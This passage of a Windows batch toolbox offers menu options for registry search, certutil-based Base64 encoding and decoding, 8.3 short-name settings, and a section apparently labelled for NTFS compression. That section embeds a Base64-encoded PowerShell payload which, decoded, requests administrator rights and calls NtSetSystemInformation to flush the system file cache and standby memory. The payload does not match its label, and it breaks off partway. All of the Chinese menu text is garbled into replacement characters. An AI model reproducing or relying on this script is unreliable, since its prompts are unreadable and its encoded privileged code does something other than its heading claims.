echo _______________________________________________________________________________
echo �����������&pause>nul
goto 61
:62
title ע�������%system%
cls
set zcbss=
set/p zcbss=������Ҫ����������:
set zcbss="%zcbss:|=%"
echo _______________________________________________________________________________
echo (1/5)��HKEY_CLASSES_ROOT������...
reg query hkcr /f !zcbss! /s
echo _______________________________________________________________________________
echo (2/5)��HKEY_CURRENT_USER������...
reg query hkcu /f !zcbss! /s
echo _______________________________________________________________________________
echo (3/5)��HKEY_LOCAL_MACHINE������...
reg query hklm /f !zcbss! /s
echo _______________________________________________________________________________
echo (4/5)��HKEY_USERS������...
reg query hku /f !zcbss! /s
echo _______________________________________________________________________________
echo (5/5)��HKEY_CURRENT_CONFIG������...
reg query hkcc /f !zcbss! /s
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:63
title Base�����%system%
cls
if exist %systemroot%\system32\certutil.exe (dir/ad %systemroot%\system32\certutil.exe>nul 2>nul||goto 63-0)
echo û���ҵ�certutil.exe
echo ���ܼ���Base�����
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:63-0
echo _______________________________________________________________________________
echo [1]Base����
echo [2]Base����
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 120 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" goto 63-1
if "%errorlevel%" equ "2" goto 63-2
if "%errorlevel%" equ "3" goto memuv2
goto 63
set basexx=
set/p basexx=���������ѡ��:
set basexx="%basexx:|=%"
if !basexx!=="1" goto 63-1
if !basexx!=="2" goto 63-2
if !basexx!=="0" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 63
:63-1
cls
del/f/q %temp%\codetmp>nul 2>nul
title Base����%system%
set basebm=
set/p basebm=����Ҫ������ַ������ļ�·��:
if "!basebm!"=="" goto 63-1
if not exist "!basebm!" (echo !basebm!>%temp%\tmp
certutil -decode -f %temp%\tmp %temp%\codetmp>nul&goto 63-11)
if "!basebm:~0,1!!basebm:~-1!" neq """" for /f "delims=" %%a in ('"echo !basebm!"') do (set !basebm!="%%~a")
dir/ad "!basebm!" >nul 2>nul&&echo ���ܽ����ļ���||goto 63-12
ping/n 2 0.0>nul
goto 63-1
:63-12
certutil -decode -f "!basebm!" %temp%\codetmp>nul
:63-11
cls
echo _______________________________________________________________________________
echo ��������: !basebm!
echo ��������:
if exist %temp%\codetmp (type %temp%\codetmp) else (echo ����ʧ��)
echo;
echo _______________________________________________________________________________
set bxz=
set/p bxz=����"y"�������,�������뷵���ϼ��˵�:
set bxz="%bxz:|=%"
if !bxz!=="y" goto 63(1)(2)
goto 63
:63(1)(2)
set basebc=
set/p basebc=���뱣��·��:
echo _______________________________________________________________________________
copy/y/z %temp%\codetmp !basebc!
if %errorlevel% neq 0 (echo ����ʧ��) else (echo ����ɹ�)
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto 63
:63-2
cls
del/f/q %temp%\codetmp>nul 2>nul
title Base����%system%
set basebm=
set/p basebm=����Ҫ������ַ������ļ�·��:
if "!basebm!"=="" goto 63-2
if not exist "!basebm!" (set /p =!basebm!<nul>%temp%\tmp
certutil -encode -f %temp%\tmp %temp%\codetmp>nul&goto 63-21)
if "!basebm:~0,1!!basebm:~-1!" neq """" for /f "delims=" %%a in ('"echo !basebm!"') do (set !basebm!="%%~a")
dir/ad "!basebm!" >nul 2>nul&&echo ���ܱ����ļ���||goto 63-22
ping/n 2 0.0>nul
goto 63-2
:63-22
certutil -encode -f "!basebm!" %temp%\codetmp>nul
:63-21
cls 
echo _______________________________________________________________________________
echo ��������: !basebm!
echo ��������:
for /f "delims=" %%a in (%temp%\codetmp) do (if "%%a" neq "-----BEGIN CERTIFICATE-----" (if "%%a" neq "-----END CERTIFICATE-----" (echo %%a)))
echo _______________________________________________________________________________
set bxz=
set/p bxz=����"y"�������,�������뷵���ϼ��˵�:
set bxz="%bxz:|=%"
if !bxz!=="y" goto 63(2)(2)
goto 63
:63(2)(2)
set basebc=
set/p basebc=���뱣��·��:
echo _______________________________________________________________________________
copy/y/z %temp%\codetmp !basebc!
if %errorlevel% neq 0 (echo ����ʧ��) else (echo ����ɹ�)
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto 63
:64
title 8.3���ļ�������%system%
cls
echo _______________________________________________________________________________
echo [1]��ѯ8.3���ļ���״̬
echo [2]��ֹ8.3���ļ�������
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 120 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" goto 64-1
if "%errorlevel%" equ "2" goto 64-2
if "%errorlevel%" equ "3" goto memuv2
goto 64
set name83=
set/p name83=���������ѡ��:
set name83="%name83:|=%"
if !name83!=="1" goto 64-1
if !name83!=="2" goto 64-2
if !name83!=="0" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 64
:64-1
cls
fsutil fsinfo drives
set query83=
set/p query83=������Ҫ��ѯ���̷�:
fsutil 8dot3name query %query83%:
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto 64
:64-2
cls
fsutil 8dot3name set 1
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto 64
:65
title ����NTFSѹ��%system%
cls
set url=
set/p url=������Ҫѹ�����ļ���:
set url="%url:|=%"
dir /ad !url!>nul 2>nul||echo ·�� !url! ����һ���ļ���&&timeout /t 2 /nobreak>nul&&goto 65
(
echo //5JAGYAIAAoAC0ATgBPAFQAIAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkA
echo bgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0A
echo IABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4A
echo ZABvAHcAcwBJAGQAZQBuAHQAaQB0AHkAXQA6ADoARwBlAHQAQwB1AHIAcgBlAG4A
echo dAAoACkAKQAuAEkAcwBJAG4AUgBvAGwAZQAoAGAADQAKACAAIAAgACAAWwBTAGUA
echo YwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMA
echo QgB1AGkAbAB0AEkAbgBSAG8AbABlAF0AIAAiAEEAZABtAGkAbgBpAHMAdAByAGEA
echo dABvAHIAIgApACkADQAKAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0AVwBhAHIA
echo bgBpAG4AZwAgABwgWQBvAHUAIABkAG8AIABuAG8AdAAgAGgAYQB2AGUAIABBAGQA
echo bQBpAG4AaQBzAHQAcgBhAHQAbwByACAAcgBpAGcAaAB0AHMAIAB0AG8AIAByAHUA
echo bgAgAHQAaABpAHMAIABzAGMAcgBpAHAAdAAhAGAAbgBQAGwAZQBhAHMAZQAgAHIA
echo ZQAtAHIAdQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0ACAAYQBzACAAYQBuACAA
echo QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAhAB0gDQAKACAAIAAgACAAQgByAGUA
echo YQBrAA0ACgB9AA0ACgANAAoAJABTAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUA
echo cwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQA
echo ZQBtAC4AQwBvAG0AcABvAG4AZQBuAHQATQBvAGQAZQBsADsADQAKAHUAcwBpAG4A
echo ZwAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAA
echo UwBlAHIAdgBpAGMAZQBzADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4A
echo UwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwAOwANAAoADQAKAG4A
echo YQBtAGUAcwBwAGEAYwBlACAAQwBsAGUAYQByAFMAdABhAG4AZABiAHkATABpAHMA
echo dAANAAoAewANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFAA
echo cgBvAGcAcgBhAG0ADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgAGMA
echo bwBuAHMAdAAgAGkAbgB0ACAAUwBFAF8AUABSAEkAVgBJAEwARQBHAEUAXwBFAE4A
echo QQBCAEwARQBEACAAPQAgADIAOwANAAoAIAAgACAAIAAgACAAIAAgAGMAbwBuAHMA
echo dAAgAHMAdAByAGkAbgBnACAAUwBFAF8ASQBOAEMAUgBFAEEAUwBFAF8AUQBVAE8A
echo VABBAF8ATgBBAE0ARQAgAD0AIAAiAFMAZQBJAG4AYwByAGUAYQBzAGUAUQB1AG8A
echo dABhAFAAcgBpAHYAaQBsAGUAZwBlACIAOwANAAoAIAAgACAAIAAgACAAIAAgAGMA
echo bwBuAHMAdAAgAHMAdAByAGkAbgBnACAAUwBFAF8AUABSAE8ARgBJAEwARQBfAFMA
echo SQBOAEcATABFAF8AUABSAE8AQwBFAFMAUwBfAE4AQQBNAEUAIAA9ACAAIgBTAGUA
echo UAByAG8AZgBpAGwAZQBTAGkAbgBnAGwAZQBQAHIAbwBjAGUAcwBzAFAAcgBpAHYA
echo aQBsAGUAZwBlACIAOwANAAoAIAAgACAAIAAgACAAIAAgAGMAbwBuAHMAdAAgAGkA
echo bgB0ACAAUwB5AHMAdABlAG0ARgBpAGwAZQBDAGEAYwBoAGUASQBuAGYAbwByAG0A
echo YQB0AGkAbwBuACAAPQAgADAAeAAwADAAMQA1ADsADQAKACAAIAAgACAAIAAgACAA
echo IABjAG8AbgBzAHQAIABpAG4AdAAgAFMAeQBzAHQAZQBtAE0AZQBtAG8AcgB5AEwA
echo aQBzAHQASQBuAGYAbwByAG0AYQB0AGkAbwBuACAAPQAgADAAeAAwADAANQAwADsA
echo DQAKACAAIAAgACAAIAAgACAAIABjAG8AbgBzAHQAIABpAG4AdAAgAE0AZQBtAG8A
echo cgB5AFAAdQByAGcAZQBTAHQAYQBuAGQAYgB5AEwAaQBzAHQAIAA9ACAANAA7AA0A
echo CgANAAoAIAAgACAAIAAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEA
echo ZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIA
echo bwByACAAPQAgAHQAcgB1AGUAKQBdAA0ACgAgACAAIAAgACAAIAAgACAAaQBuAHQA
echo ZQByAG4AYQBsACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwA
echo IABMAG8AbwBrAHUAcABQAHIAaQB2AGkAbABlAGcAZQBWAGEAbAB1AGUAKABzAHQA
echo cgBpAG4AZwAgAGgAbwBzAHQALAAgAHMAdAByAGkAbgBnACAAbgBhAG0AZQAsACAA
echo cgBlAGYAIABsAG8AbgBnACAAcABsAHUAaQBkACkAOwANAAoADQAKACAAIAAgACAA
echo IAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBhAGQAdgBhAHAAaQAzADIA
echo LgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgAgAD0AIAB0AHIA
echo dQBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAGkAbgB0AGUAcgBuAGEAbAAgAHMA
echo dABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAQQBkAGoAdQBzAHQA
echo VABvAGsAZQBuAFAAcgBpAHYAaQBsAGUAZwBlAHMAKABJAG4AdABQAHQAcgAgAGgA
echo dABvAGsALAAgAGIAbwBvAGwAIABkAGkAcwBhAGwAbAAsACAAcgBlAGYAIABUAG8A
echo awBQAHIAaQB2ADEATAB1AGkAZAAgAG4AZQB3AHMAdAAsACAAaQBuAHQAIABsAGUA
echo bgAsACAASQBuAHQAUAB0AHIAIABwAHIAZQB2ACwAIABJAG4AdABQAHQAcgAgAHIA
echo ZQBsAGUAbgApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAWwBEAGwAbABJAG0A
echo cABvAHIAdAAoACIAbgB0AGQAbABsAC4AZABsAGwAIgApAF0ADQAKACAAIAAgACAA
echo IAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4A
echo IABVAEkAbgB0ADMAMgAgAE4AdABTAGUAdABTAHkAcwB0AGUAbQBJAG4AZgBvAHIA
echo bQBhAHQAaQBvAG4AKABpAG4AdAAgAEkAbgBmAG8AQwBsAGEAcwBzACwAIABJAG4A
echo dABQAHQAcgAgAEkAbgBmAG8ALAAgAGkAbgB0ACAATABlAG4AZwB0AGgAKQA7AA0A
echo CgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGIA
echo bwBvAGwAIABJAHMANgA0AEIAaQB0AE0AbwBkAGUAKAApAA0ACgAgACAAIAAgACAA
echo IAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4A
echo IABNAGEAcgBzAGgAYQBsAC4AUwBpAHoAZQBPAGYAKAB0AHkAcABlAG8AZgAoAEkA
echo bgB0AFAAdAByACkAKQAgAD0APQAgADgAOwANAAoAIAAgACAAIAAgACAAIAAgAH0A
echo DQAKAA0ACgAgACAAIAAgACAAIAAgACAAcwB0AGEAdABpAGMAIAB2AG8AaQBkACAA
echo TQBhAGkAbgAoAHMAdAByAGkAbgBnAFsAXQAgAGEAcgBnAHMAKQANAAoAIAAgACAA
echo IAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAbABlAGEA
echo cgBGAGkAbABlAFMAeQBzAHQAZQBtAEMAYQBjAGgAZQAoAHQAcgB1AGUAKQA7AA0A
echo CgAgACAAIAAgACAAIAAgACAAfQANAAoADQAKACAAIAAgACAAIAAgACAAIABwAHUA
echo YgBsAGkAYwAgAHMAdABhAHQAaQBjACAAdgBvAGkAZAAgAEMAbABlAGEAcgBGAGkA
echo bABlAFMAeQBzAHQAZQBtAEMAYQBjAGgAZQAoAGIAbwBvAGwAIABDAGwAZQBhAHIA
echo UwB0AGEAbgBkAGIAeQBDAGEAYwBoAGUAKQANAAoAIAAgACAAIAAgACAAIAAgAHsA
echo DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgAGkAZgAgACgAUwBlAHQASQBuAGMAcgBlAGEAcwBlAFAAcgBpAHYAaQBsAGUA
echo ZwBlACgAUwBFAF8ASQBOAEMAUgBFAEEAUwBFAF8AUQBVAE8AVABBAF8ATgBBAE0A
echo RQApACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewANAAoA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAaQBuAHQA
echo IABuAHUAbQAxADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIABpAG4AdAAgAFMAeQBzAHQAZQBtAEkAbgBmAG8ATABlAG4AZwB0AGgA
echo OwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEcA
echo QwBIAGEAbgBkAGwAZQAgAGcAYwBIAGEAbgBkAGwAZQA7AA0ACgAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAhAEkAcwA2ADQA
echo QgBpAHQATQBvAGQAZQAoACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgAFMAWQBTAFQARQBNAF8AQwBBAEMASABFAF8A
echo SQBOAEYATwBSAE0AQQBUAEkATwBOACAAYwBhAGMAaABlAEkAbgBmAG8AcgBtAGEA
echo dABpAG8AbgAgAD0AIABuAGUAdwAgAFMAWQBTAFQARQBNAF8AQwBBAEMASABFAF8A
echo SQBOAEYATwBSAE0AQQBUAEkATwBOACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABjAGEAYwBoAGUASQBuAGYA
echo bwByAG0AYQB0AGkAbwBuAC4ATQBpAG4AaQBtAHUAbQBXAG8AcgBrAGkAbgBnAFMA
echo ZQB0ACAAPQAgAHUAaQBuAHQALgBNAGEAeABWAGEAbAB1AGUAOwANAAoAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAGMA
echo aABlAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAE0AYQB4AGkAbQB1AG0AVwBvAHIA
echo awBpAG4AZwBTAGUAdAAgAD0AIAB1AGkAbgB0AC4ATQBhAHgAVgBhAGwAdQBlADsA
echo DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgAFMAeQBzAHQAZQBtAEkAbgBmAG8ATABlAG4AZwB0AGgAIAA9ACAATQBhAHIA
echo cwBoAGEAbAAuAFMAaQB6AGUATwBmACgAYwBhAGMAaABlAEkAbgBmAG8AcgBtAGEA
echo dABpAG8AbgApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgAGcAYwBIAGEAbgBkAGwAZQAgAD0AIABHAEMASABhAG4A
echo ZABsAGUALgBBAGwAbABvAGMAKABjAGEAYwBoAGUASQBuAGYAbwByAG0AYQB0AGkA
echo bwBuACwAIABHAEMASABhAG4AZABsAGUAVAB5AHAAZQAuAFAAaQBuAG4AZQBkACkA
echo OwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAbgB1AG0AMQAgAD0AIABOAHQAUwBlAHQAUwB5AHMAdABlAG0ASQBuAGYA
echo bwByAG0AYQB0AGkAbwBuACgAUwB5AHMAdABlAG0ARgBpAGwAZQBDAGEAYwBoAGUA
echo SQBuAGYAbwByAG0AYQB0AGkAbwBuACwAIABnAGMASABhAG4AZABsAGUALgBBAGQA
echo ZAByAE8AZgBQAGkAbgBuAGUAZABPAGIAagBlAGMAdAAoACkALAAgAFMAeQBzAHQA
echo ZQBtAEkAbgBmAG8ATABlAG4AZwB0AGgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABnAGMASABhAG4AZABsAGUA
echo LgBGAHIAZQBlACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgAGUAbABzAGUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIABTAFkAUwBUAEUATQBfAEMAQQBDAEgARQBfAEkA
echo TgBGAE8AUgBNAEEAVABJAE8ATgBfADYANABfAEIASQBUACAAaQBuAGYAbwByAG0A
echo YQB0AGkAbwBuADYANABCAGkAdAAgAD0AIABuAGUAdwAgAFMAWQBTAFQARQBNAF8A
echo QwBBAEMASABFAF8ASQBOAEYATwBSAE0AQQBUAEkATwBOAF8ANgA0AF8AQgBJAFQA
echo KAApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgA2ADQAQgBpAHQALgBNAGkA
echo bgBpAG0AdQBtAFcAbwByAGsAaQBuAGcAUwBlAHQAIAA9ACAALQAxAEwAOwANAAoA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo aQBuAGYAbwByAG0AYQB0AGkAbwBuADYANABCAGkAdAAuAE0AYQB4AGkAbQB1AG0A
echo VwBvAHIAawBpAG4AZwBTAGUAdAAgAD0AIAAtADEATAA7AA0ACgAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUA
echo bQBJAG4AZgBvAEwAZQBuAGcAdABoACAAPQAgAE0AYQByAHMAaABhAGwALgBTAGkA
echo egBlAE8AZgAoAGkAbgBmAG8AcgBtAGEAdABpAG8AbgA2ADQAQgBpAHQAKQA7AA0A
echo CgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IABnAGMASABhAG4AZABsAGUAIAA9ACAARwBDAEgAYQBuAGQAbABlAC4AQQBsAGwA
echo bwBjACgAaQBuAGYAbwByAG0AYQB0AGkAbwBuADYANABCAGkAdAAsACAARwBDAEgA
echo YQBuAGQAbABlAFQAeQBwAGUALgBQAGkAbgBuAGUAZAApADsADQAKACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG4AdQBtADEA
echo IAA9ACAATgB0AFMAZQB0AFMAeQBzAHQAZQBtAEkAbgBmAG8AcgBtAGEAdABpAG8A
echo bgAoAFMAeQBzAHQAZQBtAEYAaQBsAGUAQwBhAGMAaABlAEkAbgBmAG8AcgBtAGEA
echo dABpAG8AbgAsACAAZwBjAEgAYQBuAGQAbABlAC4AQQBkAGQAcgBPAGYAUABpAG4A
echo bgBlAGQATwBiAGoAZQBjAHQAKAApACwAIABTAHkAcwB0AGUAbQBJAG4AZgBvAEwA
echo ZQBuAGcAdABoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAZwBjAEgAYQBuAGQAbABlAC4ARgByAGUAZQAoACkA
echo OwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0A
echo DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYA
echo IAAoAG4AdQBtADEAIAAhAD0AIAAwACkADQAKACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAaAByAG8AdwAgAG4AZQB3ACAA
echo RQB4AGMAZQBwAHQAaQBvAG4AKAAiAE4AdABTAGUAdABTAHkAcwB0AGUAbQBJAG4A
echo ZgBvAHIAbQBhAHQAaQBvAG4AKABTAFkAUwBUAEUATQBDAEEAQwBIAEUASQBOAEYA
echo TwBSAE0AQQBUAEkATwBOACkAIABlAHIAcgBvAHIAOgAgACIALAAgAG4AZQB3ACAA
echo VwBpAG4AMwAyAEUAeABjAGUAcAB0AGkAbwBuACgATQBhAHIAcwBoAGEAbAAuAEcA
echo ZQB0AEwAYQBzAHQAVwBpAG4AMwAyAEUAcgByAG8AcgAoACkAKQApADsADQAKACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoAEMAbABlAGEAcgBTAHQAYQBuAGQA
echo YgB5AEMAYQBjAGgAZQAgACYAJgAgAFMAZQB0AEkAbgBjAHIAZQBhAHMAZQBQAHIA
echo aQB2AGkAbABlAGcAZQAoAFMARQBfAFAAUgBPAEYASQBMAEUAXwBTAEkATgBHAEwA
echo RQBfAFAAUgBPAEMARQBTAFMAXwBOAEEATQBFACkAKQANAAoAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgANAAoAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgAGkAbgB0ACAAUwB5AHMAdABlAG0ASQBuAGYA
echo bwBMAGUAbgBnAHQAaAAgAD0AIABNAGEAcgBzAGgAYQBsAC4AUwBpAHoAZQBPAGYA
echo KABNAGUAbQBvAHIAeQBQAHUAcgBnAGUAUwB0AGEAbgBkAGIAeQBMAGkAcwB0ACkA
echo OwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEcA
echo QwBIAGEAbgBkAGwAZQAgAGcAYwBIAGEAbgBkAGwAZQAgAD0AIABHAEMASABhAG4A
echo ZABsAGUALgBBAGwAbABvAGMAKABNAGUAbQBvAHIAeQBQAHUAcgBnAGUAUwB0AGEA
echo bgBkAGIAeQBMAGkAcwB0ACwAIABHAEMASABhAG4AZABsAGUAVAB5AHAAZQAuAFAA
echo aQBuAG4AZQBkACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgAHUAaQBuAHQAIABuAHUAbQAyACAAPQAgAE4AdABTAGUAdABTAHkA
echo cwB0AGUAbQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AKABTAHkAcwB0AGUAbQBNAGUA
echo bQBvAHIAeQBMAGkAcwB0AEkAbgBmAG8AcgBtAGEAdABpAG8AbgAsACAAZwBjAEgA
echo YQBuAGQAbABlAC4AQQBkAGQAcgBPAGYAUABpAG4AbgBlAGQATwBiAGoAZQBjAHQA
echo KAApACwAIABTAHkAcwB0AGUAbQBJAG4AZgBvAEwAZQBuAGcAdABoACkAOwANAAoA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAYwBIAGEA
echo bgBkAGwAZQAuAEYAcgBlAGUAKAApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoAG4AdQBtADIAIAAhAD0AIAAwACkA
echo DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgAHQAaAByAG8AdwAgAG4AZQB3ACAARQB4AGMAZQBwAHQAaQBvAG4AKAAiAE4A
echo dABTAGUAdABTAHkAcwB0AGUAbQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AKABTAFkA
echo UwBUAEUATQBNAEUATQBPAFIAWQBMAEkAUwBUAEkATgBGAE8AUgBNAEEAVABJAE8A
echo TgApACAAZQByAHIAbwByADoAIAAiACwAIABuAGUAdwAgAFcAaQBuADMAMgBFAHgA
echo YwBlAHAAdABpAG8AbgAoAE0AYQByAHMAaABhAGwALgBHAGUAdABMAGEAcwB0AFcA
echo aQBuADMAMgBFAHIAcgBvAHIAKAApACkAKQA7AA0ACgAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0A
echo DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGMAYQB0AGMAaAAgACgARQB4AGMA
echo ZQBwAHQAaQBvAG4AIABlAHgAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo ewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABDAG8AbgBzAG8A
echo bABlAC4AVwByAGkAdABlACgAZQB4AC4AVABvAFMAdAByAGkAbgBnACgAKQApADsA
echo DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAA
echo IAB9AA0ACgANAAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABzAHQA
echo YQB0AGkAYwAgAGIAbwBvAGwAIABTAGUAdABJAG4AYwByAGUAYQBzAGUAUAByAGkA
echo dgBpAGwAZQBnAGUAKABzAHQAcgBpAG4AZwAgAHAAcgBpAHYAaQBsAGUAZwBlAE4A
echo YQBtAGUAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgAHUAcwBpAG4AZwAgACgAVwBpAG4AZABvAHcAcwBJAGQAZQBuAHQA
echo aQB0AHkAIABjAHUAcgByAGUAbgB0ACAAPQAgAFcAaQBuAGQAbwB3AHMASQBkAGUA
echo bgB0AGkAdAB5AC4ARwBlAHQAQwB1AHIAcgBlAG4AdAAoAFQAbwBrAGUAbgBBAGMA
echo YwBlAHMAcwBMAGUAdgBlAGwAcwAuAFEAdQBlAHIAeQAgAHwAIABUAG8AawBlAG4A
echo QQBjAGMAZQBzAHMATABlAHYAZQBsAHMALgBBAGQAagB1AHMAdABQAHIAaQB2AGkA
echo bABlAGcAZQBzACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewANAAoA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABUAG8AawBQAHIAaQB2ADEA
echo TAB1AGkAZAAgAG4AZQB3AHMAdAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgAG4AZQB3AHMAdAAuAEMAbwB1AG4AdAAgAD0AIAAxADsADQAKACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbgBlAHcAcwB0AC4ATAB1AGkA
echo ZAAgAD0AIAAwAEwAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IABuAGUAdwBzAHQALgBBAHQAdAByACAAPQAgAFMARQBfAFAAUgBJAFYASQBMAEUA
echo RwBFAF8ARQBOAEEAQgBMAEUARAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAA
